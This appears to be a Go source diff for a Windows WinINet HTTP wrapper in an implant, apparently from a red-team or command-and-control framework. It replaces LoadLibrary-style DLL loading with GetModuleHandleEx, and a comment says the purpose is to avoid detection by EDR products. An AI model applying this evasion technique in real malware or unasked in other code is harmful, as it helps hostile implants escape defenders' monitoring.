@@ -8,7 +8,33 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-var wininet *windows.LazyDLL = windows.NewLazySystemDLL("Wininet")
+var wininet *windows.DLL
+
+// InitWininet obtains a handle to an already loaded Wininet.dll
+// This avoids using LoadLibrary which can be detected by EDRs.
+func Init() error {
+	const procName = "Wininet.dll"
+	dllName, err := windows.UTF16PtrFromString(procName)
+	if err != nil {
+		return fmt.Errorf("failed to convert %s to UTF16 pointer: %w", procName, err)
+	}
+
+	var handle windows.Handle
+	err = windows.GetModuleHandleEx(0, dllName, &handle)
+	if err != nil {
+		return fmt.Errorf("[WinINet] GetModuleHandleEx(%s) failed: %w. The implant cannot perform HTTP requests", procName, err)
+	}
+	if handle == 0 {
+		return fmt.Errorf("[WinINet] GetModuleHandleEx(%s) returned a null handle. The DLL is not loaded in the target process", procName)
+	}
+
+	wininet = &windows.DLL{
+		Name:   procName,
+		Handle: handle,
+	}
+
+	return nil
+}
 
 // HTTPAddRequestHeadersW is from wininet.h
 func HTTPAddRequestHeadersW(
@@ -35,12 +61,17 @@ func HTTPAddRequestHeadersW(
 
 	pswzHeader = uintptr(unsafe.Pointer(tmp))
 
-	ok, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	ok, _, err = procedure.Call(
 		reqHndl,
 		pswzHeader,
 		uintptr(len(header)),
 		addMethod,
 	)
+	
 	if ok == 0 {
 		return fmt.Errorf("%s: %w", proc, err)
 	}
@@ -116,7 +147,11 @@ func HTTPOpenRequestW(
 		lpcwstrVersion = uintptr(unsafe.Pointer(tmp))
 	}
 
-	reqHndl, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return 0, fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	reqHndl, _, err = procedure.Call(
 		connHndl,
 		lpcwstrVerb,
 		lpcwstrObjectName,
@@ -153,7 +188,11 @@ func HTTPQueryInfoW(
 		b = make([]uint16, 1)
 	}
 
-	success, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, err = procedure.Call(
 		reqHndl,
 		info,
 		uintptr(unsafe.Pointer(&b[0])),
@@ -199,7 +238,11 @@ func HTTPSendRequestW(
 		lpcwstrHeaders = uintptr(unsafe.Pointer(tmp))
 	}
 
-	success, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, err = procedure.Call(
 		reqHndl,
 		lpcwstrHeaders,
 		uintptr(headersLen),
@@ -257,7 +300,11 @@ func InternetConnectW(
 		lpcwstrUserName = uintptr(unsafe.Pointer(tmp))
 	}
 
-	connHndl, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return 0, fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	connHndl, _, err = procedure.Call(
 		sessionHndl,
 		lpcwstrServerName,
 		uintptr(serverPort),
@@ -316,7 +363,11 @@ func InternetOpenW(
 		lpszProxyBypass = uintptr(unsafe.Pointer(tmp))
 	}
 
-	sessionHndl, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return 0, fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	sessionHndl, _, err = procedure.Call(
 		lpszAgent,
 		accessType,
 		lpszProxy,
@@ -339,7 +390,11 @@ func InternetQueryDataAvailable(
 	var proc string = "InternetQueryDataAvailable"
 	var success uintptr
 
-	success, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, err = procedure.Call(
 		reqHndl,
 		uintptr(unsafe.Pointer(bytesAvailable)),
 		0,
@@ -370,7 +425,11 @@ func InternetReadFile(
 		b = make([]byte, 1)
 	}
 
-	success, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, err = procedure.Call(
 		reqHndl,
 		uintptr(unsafe.Pointer(&b[0])),
 		uintptr(bytesToRead),
@@ -401,7 +460,11 @@ func InternetSetOptionW(
 		val = make([]byte, 1)
 	}
 
-	success, _, err = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, err = procedure.Call(
 		hndl,
 		opt,
 		uintptr(unsafe.Pointer(&val[0])),
@@ -428,7 +491,11 @@ func InternetErrorDlg(
 
 	buf = make([]byte, 1024) //arbitrary size (safe?)
 
-	success, _, _ = wininet.NewProc(proc).Call(
+	procedure, err := wininet.FindProc(proc)
+	if err != nil {
+		return 0, fmt.Errorf("[WinINet] %s not found: %w", proc, err)
+	}
+	success, _, _ = procedure.Call(
 		uintptr(hWnd),
 		hRequest,
 		uintptr(dwError),
